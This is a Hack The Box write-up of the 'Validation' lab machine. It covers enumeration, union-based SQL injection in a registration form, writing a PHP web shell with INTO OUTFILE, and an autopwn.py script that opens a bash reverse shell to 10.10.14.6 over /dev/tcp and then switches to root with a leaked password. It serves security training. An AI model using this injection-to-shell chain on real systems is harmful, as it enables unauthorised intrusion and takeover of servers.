---
layout: post
title:  "Validation Writeup - Hack The Box"
date:   2023-11-05
desc: "SQLi Error Based, Information Leakage"
keywords: "HTB,eJPT,eWPT,Easy"
categories: [HTB]
tags: [HTB,eJPT,eWPT,Linux,SQLi,ErrorBased,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

The [Hack The Box](https://www.hackthebox.com/){:target="_blank"} **Validation** box has a Linux OS, classified as easy. I always tell myself that rating it will depend on many factors, so for some it may be easy and for others it may not.
I'm going to start by respecting the recommended methodology to perform a pentesting job. I start by enumerating the box.


<br/><br/>
<img src="{{ site.img_path }}/validation_writeup/Validation.png" width="100%" style="margin: 0 auto;display: block
; max-width: 400px;">
<br/><br/>

I use the **s4vitar** script **[htbExplorer](https://github.com/s4vitar/htbExplorer){:target="_blank"}** to display the Box. And then I verify if I already have connectivity with it, if everything works correctly I can use `nmap` to list those ports that are open on the victim machine. In case I do not find open ports, I can try with other protocols or remove the --open parameter so that it does not filter those ports that are filtered.

```bash
./htbExplorer -d Validation
```

```bash
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.11.116 -oG allPorts
```
<br/>
<img src="{{ site.img_path }}/validation_writeup/Validation_00.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

There are several interesting ports, with `apache` and `nginx` web services running. So I can use basic `nmap` scripts to learn more in depth about the services available on the machine. I can also seach in **Launchpad** page to know the **Codename** of the victim machine, it can help me to know if I am in front of a container or not.

```bash
cat targeted
# OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
# google.es --> OpenSSH 8.2p1 4ubuntu0.3 launchpad    --> Focal
# Apache/2.4.48
# google.es --> Apache/2.4.48 launchpad               --> Impish        ??
```

<br/>
<img src="{{ site.img_path }}/validation_writeup/Validation_01.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I use `whatweb` to find out what technologies the web services are using, I don't find anything interesting. I access the web service on port **80** with the browser and it is a simple page that allows me to register in some kind of ranking system.

```bash
whatweb http://10.10.11.108 http://10.10.11.108:8080
```

<br/><br/>
<img src="{{ site.img_path }}/validation_writeup/Validation_02.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

When I register, I notice that the name I enter is reflected on the website, once registered, so I try **HTML** and **XSS** injections and get the expected results. I am going to try `BurpSuite`, to test if some common **SQLi** works.

```html
<marquee>oldboy</marquee>                 # :) HTML Injection
```

```js
<script>alert('hello');</script>          # :) XSS
```

```sql
admin'                                    # ???
```

```bash
burpsuite &> /dev/null & disown
```

<br/><br/>
<img src="{{ site.img_path }}/validation_writeup/Validation_03.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>
<img src="{{ site.img_path }}/validation_writeup/Validation_04.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>
<img src="{{ site.img_path }}/validation_writeup/Validation_05.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>
<img src="{{ site.img_path }}/validation_writeup/Validation_06.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I use the `BurpSuite` proxy and capture the traffic that is being sent to the server, I send the data packet that interests me to the **Repeater** and try several injections, some work but others do not show me the expected result, there is something strange in the operation of this box.

<br/><br/>
<img src="{{ site.img_path }}/validation_writeup/Validation_07.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

```sql
username=admin'&country=Brazil           # :(
username=admin&country=Brazil'           # :)
```

<br/><br/>
<img src="{{ site.img_path }}/validation_writeup/Validation_08.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

```sql
username=admin&country=Brazil'-- -
username=admin&country=Brazil'order by 100-- -
username=admin&country=Brazil'order by 10-- -
username=admin&country=Brazil'order by 1-- -
```

<br/><br/>
<img src="{{ site.img_path }}/validation_writeup/Validation_09.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

```sql
username=admin&country=Brazil' union select 1-- -
```

<br/><br/>
<img src="{{ site.img_path }}/validation_writeup/Validation_10.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

But if I perform the injection and use the **browser** instead of `BurpSuite` to see if it shows me the expected output, I find what I need.

```sql
username=admin&country=Brazil'-- -
```

<br/><br/>
<img src="{{ site.img_path }}/validation_writeup/Validation_11.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

```sql
username=admin&country=Brazil' union select database()-- -
```

<br/>
<img src="{{ site.img_path }}/validation_writeup/Validation_12.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

```sql
username=admin&country=Brazil' union select user()-- -      # :)  uhc@localhost
username=admin&country=Brazil' union select version()-- -   # :) 10.5.11-MariaDB-1
username=admin&country=Brazil' union select schema_name from information_schema.schemata-- -
```

<br/>
<img src="{{ site.img_path }}/validation_writeup/Validation_13.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

```sql
username=admin&country=Brazil' union select table_name from information_schema.tables where table_schema='registration'-- -
```

<br/>
<img src="{{ site.img_path }}/validation_writeup/Validation_14.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

```sql
username=admin&country=Brazil' union select column_name from information_schema.columns where table_schema='registration' and table_name='registration'-- -
```

<br/>
<img src="{{ site.img_path }}/validation_writeup/Validation_15.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I get hashes of users that I was registering in the web service, by performing a SQLi of the table that Registration, so it does not help me much to be able to access the box.

<br/><br/>
<img src="{{ site.img_path }}/validation_writeup/Validation_16.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I can try to use a **SQLi** to save some content in a file on the server and then try to access it from the **browser** to verify its creation. But if I perform the injection with `BurpSuite` and try to access directly to the content, entering the path informs me that it does not exist, something strange is happening.

```sql
username=admin&country=Brazil' union select 'testing' into outfile '/var/www/html/test.txt'-- -
```

<br/>
<img src="{{ site.img_path }}/validation_writeup/Validation_17.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>

I try different ways until I find the right way to create the file and access it. First I perform the **SQLi** from the **Repeater** or I can also capture the correct packet and inject the **SQL query** for more security. Then I access from the browser to the website where the registered users are shown (***http://10.10.11.108/account.php***) and refresh the page, now I check if the file is created correctly.

<br/>
<img src="{{ site.img_path }}/validation_writeup/Validation_18.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<br/>
<img src="{{ site.img_path }}/validation_writeup/Validation_19.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<br/>
<img src="{{ site.img_path }}/validation_writeup/Validation_20.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<br/>
<img src="{{ site.img_path }}/validation_writeup/Validation_21.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

As I notice that the **Apache** server is able to interpret files in `PHP` format, I try to perform a **RCE** by creating a file with `.php` extension. I perform the same steps mentioned above and get the expected output when executing the `whoami` command.

<br/><br/>
<img src="{{ site.img_path }}/validation_writeup/Validation_22.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<br/>
<img src="{{ site.img_path }}/validation_writeup/Validation_23.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<br/>
<img src="{{ site.img_path }}/validation_writeup/Validation_24.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Perform some test commands and an interesting fact is that the machine I want to access is a container, I can deduce it by the network address that is displayed when running the `hostname -I` command.

<br/>
<img src="{{ site.img_path }}/validation_writeup/Validation_25.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Together with the [hack4u](https://hack4u.io/){:target="_blank"} community, a script was created to automate the whole procedure to access the machine.

> **`autopwn.py`**

```python
#!/usr/bin/python3

from pwn import *
import signal, pdb, requests

def def_handler(sig, frame):
    print("\n\n[!] Exiting...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) !=3:
    log.failure("Use: %s <ip-address> filename" % sys.argv[0])
    sys.exit(1)

# Global Variables
ip_address = sys.argv[1]
filename = sys.argv[2]
main_url = "http://%s/" % ip_address
lport = 443

#pdb.set_trace()

def createFile():
    
    data_post = {
            'username': 'admin',
            'country': """Brazil' union select "<?php system($_REQUEST['cmd']); ?>" into outfile '/var/www/html/%s'-- -""" % filename
    }

    r = requests.post(main_url, data=data_post)


def getAccess():

    data_post = {
            'cmd': "bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'"
    }

    r = requests.post(main_url + "%s" % filename, data=data_post)

if __name__ == '__main__':

    createFile()
    try:
        threading.Thread(target=getAccess, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()
    shell.interactive()
```

<br/>
<img src="{{ site.img_path }}/validation_writeup/Validation_26.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

When running the script, I notice some permission errors, due to the **Reverse Shell** I am trying to send to my machine. When I run the script again as `root`, now I have a problem with the `pwn` **module**, the solution I found is to update the version con `pip`.

```python
python3 -m pip install --upgrade pwn
```

Once I access the machine, I perform a **TTY treatment** in order to have a fully iteractive shell. If I list the files in the current directory I find a suspicious `config.php` file, and if I open it I find a password. And if I check if such user has a **bash shell** assigned, inspecting the passwd file, I see that it does not. Then I try to pivot to the `root` user and the password works, I have already to rooted the box.

```bash
script /dev/null -c bash      [Ctrl+z]
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 29 columns 128
```

<br/>
<img src="{{ site.img_path }}/validation_writeup/Validation_27.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

You can modify the `autopwn.py` script to directly **rooted** the box, just by adding some additional lines, since the privilege escalation is simple.

```python
#!/usr/bin/python3

from pwn import *
import signal, pdb, requests

def def_handler(sig, frame):
    print("\n\n[!] Exiting...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) !=3:
    log.failure("Use: %s <ip-address> filename" % sys.argv[0])
    sys.exit(1)

# Global Variables
ip_address = sys.argv[1]
filename = sys.argv[2]
main_url = "http://%s/" % ip_address
lport = 443

#pdb.set_trace()

def createFile():
    
    data_post = {
            'username': 'admin',
            'country': """Brazil' union select "<?php system($_REQUEST['cmd']); ?>" into outfile '/var/www/html/%s'-- -""" % filename
    }

    r = requests.post(main_url, data=data_post)


def getAccess():

    data_post = {
            'cmd': "bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'"
    }

    r = requests.post(main_url + "%s" % filename, data=data_post)

if __name__ == '__main__':

    createFile()
    try:
        threading.Thread(target=getAccess, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()
    shell.sendline("su root")
    time.sleep(2)
    shell.sendline("uhc-9qual-global-pw")
    shell.interactive()
```

<br/>
<img src="{{ site.img_path }}/validation_writeup/Validation_28.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

> The only thing left to do is to kill the **Validation** box with `htbExplorer`

```bash
./htbExplorer -k Validation
```
